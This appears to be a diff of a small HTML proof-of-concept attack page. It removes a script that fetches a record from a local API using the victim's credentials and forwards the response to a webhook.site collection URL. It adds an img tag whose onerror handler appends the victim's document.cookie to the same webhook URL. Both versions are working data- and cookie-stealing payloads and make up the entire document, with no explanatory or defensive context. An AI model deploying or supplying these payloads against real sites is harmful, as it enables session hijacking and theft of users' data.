@@ -1,18 +1,7 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <script>
-      fetch(
-        "http://127.0.0.1:4000/api/quotes/1b9d6bcd-bbfd-4b2d-9b5d-ab8dfbbd4bed",
-        { credentials: "include" }
-      )
-        .then((res) => res.text())
-        .then((data) => {
-          fetch(
-            "https://webhook.site/45d87485-8981-4643-bf5b-33a7a42423ce?data=" +
-              encodeURIComponent(data)
-          );
-        });
-    </script>
+    <img src="https://webhook.site/45d87485-8981-4643-bf5b-33a7a42423ce?cookie="
+         onerror="this.src += encodeURIComponent(document.cookie)">
   </body>
 </html>
